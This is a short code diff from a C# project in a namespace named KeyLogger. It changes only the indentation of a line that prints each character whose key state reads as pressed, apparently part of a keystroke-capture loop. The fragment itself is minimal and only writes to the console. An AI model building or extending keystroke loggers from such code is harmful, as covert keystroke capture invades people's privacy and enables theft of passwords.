@@ -22,7 +22,7 @@ namespace KeyLogger
                     {
                         if (keystate == 32768)
                         {
-                        Console.Write((char) i + ", ");
+                            Console.Write((char)i + ", ");
                         }
                     }
                 }
